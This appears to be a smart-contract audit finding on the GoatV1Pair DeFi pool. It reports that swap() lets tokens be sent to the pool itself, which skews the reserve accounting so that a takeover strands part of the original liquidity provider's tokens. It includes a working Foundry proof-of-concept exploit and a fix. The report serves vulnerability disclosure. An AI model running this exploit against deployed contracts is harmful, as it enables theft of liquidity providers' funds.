Little Onyx Mongoose

high

# Malicious user can steal a portion of initial liquidity providers ERC20 tokens during a takeover

## Summary
When performing a swap there is no check that the `to` address is not the pool itself. This can break the internal accounting of the `_reserveToken` due to not checking if the funds were sent to the pool itself. A malicious liquidity provider can exploit this to steal the originally deposited tokens from the previous liquidity provider during a takeover.

## Vulnerability Detail
When performing a swap there is no check that the `to` address is not the pool itself. If a malicious user performs a swap they can send the tokens directly to the `GoatV1Pair` pool. At the end of the swap the `finalTokenReserve` is updated to be

```solidity
swapVars.finalReserveToken = swapVars.isBuy
            ? swapVars.initialReserveToken - amountTokenOut
            : swapVars.initialReserveToken + swapVars.amountTokenIn;
```
https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L294-L296

In the case where `isBuy = true` the `finalReserveToken` will be reduced by `amountTokenOut` even though the tokens are still inside of the pool. If a malicious user then immediately performs takeOver after the swap,  the token amount refunded to the original liquidity provider will be much less than it should be due to the incorrect `reserveToken` resulting in the malicious user keeping some of the original liquidity providers ERC20 deposit:

```solidity
        _handleTakeoverTransfers(
            IERC20(_weth), IERC20(_token), initialLpInfo.liquidityProvider, localVars.reserveEth, localVars.reserveToken
        );
```
https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L517-L519

## Impact
The initial liquidity provider of a `GoatV1Pool` would only be refunded a fraction of their original ERC-20 token deposit into the pool during a takeOver. The new malicious liquidity provider would then control a substantial portion of the initial liquidity providers token deposits.

## Code Snippet
https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L242-L331

## Tool used

Manual Review, Foundry

## PoC
This PoC demonstrates a malicious user performing a token swap where the `to` address is the pool itself. The malicious user then takeover the liquidity pool and steals some of the original liquidity providers ERC20 tokens.

The example below shows a malicious user performing the exploit and the initial liquidity provider only receiving a portion of their original deposit back.

```solidity
        function _getAmountTokenOut(uint256 amountIn) internal view returns (uint256 amountTokenOut) {
        GoatTypes.LocalVariables_PairStateInfo memory vars;

        (
            vars.reserveEth,
            vars.reserveToken,
            vars.virtualEth,
            vars.initialTokenMatch,
            vars.bootstrapEth,
            vars.virtualToken
        ) = pair.getStateInfoForPresale();

        uint256 tokenAmountForAmm =
                GoatLibrary.getBootstrapTokenAmountForAmm(vars.virtualEth, vars.bootstrapEth, vars.initialTokenMatch);
            amountTokenOut = GoatLibrary.getTokenAmountOutPresale(
                amountIn,
                vars.virtualEth,
                vars.reserveEth,
                vars.bootstrapEth,
                vars.reserveToken,
                vars.virtualToken,
                tokenAmountForAmm
            );
    }

    function testPoolTakeOverSuccessWithWethAndStealTokens() public {
        uint112 initTokenMatch = 100e18;
        uint112 initEthMatch = 5e21;

        GoatTypes.InitParams memory initParams;
        initParams.virtualEth = 100e21;
        initParams.initialEth = initEthMatch;
        initParams.initialTokenMatch = initTokenMatch;
        initParams.bootstrapEth = 10e21;

        (uint256 tokenAmtForPresale, uint256 tokenAmtForAmm) = _mintInitialLiquidity(initParams, users.lp);

        uint256 initialLpTokenDeposit = tokenAmtForPresale + tokenAmtForAmm;

        // change init params for takeover
        initParams.virtualEth = initEthMatch * 2;
        initParams.initialTokenMatch = initTokenMatch * 10;
        uint256 takeOverBootstrapTokenAmt = GoatLibrary.getActualBootstrapTokenAmount(
            initParams.virtualEth, initParams.bootstrapEth, initParams.initialEth, initParams.initialTokenMatch
        );


        (uint256 reserveEthBefore , uint256 tokenReserveBefore) = pair.getStateInfoAmm();
        _fundMe(goat, users.lp1, takeOverBootstrapTokenAmt * 3);
        _fundMe(weth, users.lp1, initParams.initialEth * 3);
        vm.startPrank(users.lp1);

        // Perform swap with initTokenMatch and send tokens to pool
        weth.transfer(address(pair), (initParams.initialEth * 98) / 100);

        // calculate amount of token out
        uint amountTokenOut = _getAmountTokenOut((initParams.initialEth * 98) / 100);
        pair.swap(amountTokenOut, 0, address(pair));


        goat.transfer(address(pair), takeOverBootstrapTokenAmt);
        weth.transfer(address(pair), initParams.initialEth * 2);
        pair.takeOverPool(initParams);

        pair.sync();


        vm.stopPrank();
        (, uint256 tokenReserveAfter) = pair.getStateInfoAmm();

        // Final balance of the initial liquidity provider should at least be their initial balance
        // In this case the initial lp deposited 1.25e19 goat token but only gets ~9e18 goat tokens back on the takeover
        // The rest of the tokens remain in the liquidity pool
        // The original lp only recovers a portion of their ERC20 deposit (less than 60%)
        assertLt(goat.balanceOf(users.lp), (initialLpTokenDeposit * 60) / 100);
    }
```

## Recommendation

Add a check in `GoatV1Pair::swap()` that reverts if the `to` address is the pair pool itself like so:

```solidity
require(to != address(this), "Cannot swap tokens and send them to the pool itself")
```